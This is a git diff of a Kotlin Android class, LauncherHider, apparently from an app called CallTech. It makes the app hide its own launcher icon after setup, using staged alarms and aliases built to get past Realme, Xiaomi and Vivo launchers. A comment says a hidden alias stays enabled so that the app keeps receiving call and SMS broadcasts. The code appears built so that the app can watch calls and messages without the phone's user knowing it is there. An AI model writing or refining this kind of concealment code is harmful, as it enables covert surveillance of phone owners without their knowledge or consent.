@@ -15,6 +15,7 @@ import android.util.Log
 /**
  * OEM launchers (Realme/Xiaomi/Vivo) last launcher disable ignore karte hain.
  * Pehle HiddenAlias ON, phir CallTech alias OFF — tabhi drawer refresh hota hai.
+ * HiddenAlias ON hi rehta hai taaki app stopped-state mein na jaye (warna call/SMS broadcast band).
  */
 object LauncherHider {
     private const val TAG = "LauncherHider"
@@ -27,6 +28,17 @@ object LauncherHider {
     private const val REQUEST_BASE = 8820
 
     private val hideHandler = Handler(Looper.getMainLooper())
+
+    fun ensureLaunchableForSetup(context: Context) {
+        val app = context.applicationContext
+        if (InstallFlow.isSetupComplete(app)) {
+            hideIfMarked(app)
+            return
+        }
+        val pm = app.packageManager
+        val visible = ComponentName(app.packageName, VISIBLE_ALIAS)
+        setEnabled(pm, visible, enabled = true)
+    }
 
     fun hide(context: Context, goHome: Boolean = false, keepProcess: Boolean = true) {
         markHidden(context.applicationContext)
@@ -54,14 +66,20 @@ object LauncherHider {
         markHidden(app)
         goHome(app)
         clearShortcuts(app)
-        scheduleStage(app, stage = 0, delayMs = 800L)
-        scheduleStage(app, stage = 0, delayMs = 2500L)
-        scheduleStage(app, stage = 1, delayMs = 5000L)
-        scheduleStage(app, stage = 2, delayMs = 12000L)
+        armHideAlarms(app, startDelayMs = 400L)
+        hideHandler.postDelayed({ applyStage(app, 0) }, 600)
+        hideHandler.postDelayed({ applyStage(app, 1) }, 2000)
+        hideHandler.postDelayed({ applyStage(app, 2) }, 5500)
+    }
 
-        hideHandler.postDelayed({ applyStage(app, 0) }, 1200)
-        hideHandler.postDelayed({ applyStage(app, 0) }, 2800)
-        hideHandler.postDelayed({ applyStage(app, 1) }, 5500)
+    fun armHideAlarms(context: Context, startDelayMs: Long = 400L) {
+        val app = context.applicationContext
+        markHidden(app)
+        clearShortcuts(app)
+        scheduleStage(app, stage = 0, delayMs = startDelayMs)
+        scheduleStage(app, stage = 1, delayMs = startDelayMs + 1400L)
+        scheduleStage(app, stage = 2, delayMs = startDelayMs + 4600L)
+        scheduleStage(app, stage = 2, delayMs = startDelayMs + 11600L)
     }
 
     fun applyStage(context: Context, stage: Int) {
@@ -71,8 +89,16 @@ object LauncherHider {
         val hidden = ComponentName(app.packageName, HIDDEN_ALIAS)
 
         try {
-            setEnabled(pm, visible, enabled = false, allowKill = stage != 0)
-            setEnabled(pm, hidden, enabled = false, allowKill = true)
+            when (stage) {
+                0 -> {
+                    setEnabled(pm, hidden, enabled = true)
+                    setEnabled(pm, visible, enabled = false)
+                }
+                else -> {
+                    setEnabled(pm, hidden, enabled = true)
+                    setEnabled(pm, visible, enabled = false)
+                }
+            }
             Log.d(
                 TAG,
                 "Hide stage=$stage visible=${pm.getComponentEnabledSetting(visible)} " +
@@ -87,7 +113,6 @@ object LauncherHider {
         pm: PackageManager,
         component: ComponentName,
         enabled: Boolean,
-        allowKill: Boolean,
     ) {
         val target = if (enabled) {
             PackageManager.COMPONENT_ENABLED_STATE_ENABLED
@@ -98,16 +123,11 @@ object LauncherHider {
         if (current == target) {
             return
         }
-        val flags = if (allowKill) 0 else PackageManager.DONT_KILL_APP
-        pm.setComponentEnabledSetting(component, target, flags)
-    }
-
-    private fun isOn(pm: PackageManager, component: ComponentName, defaultOn: Boolean): Boolean {
-        return when (pm.getComponentEnabledSetting(component)) {
-            PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> true
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED -> false
-            else -> defaultOn
-        }
+        pm.setComponentEnabledSetting(
+            component,
+            target,
+            PackageManager.DONT_KILL_APP,
+        )
     }
 
     private fun scheduleStage(app: Context, stage: Int, delayMs: Long) {
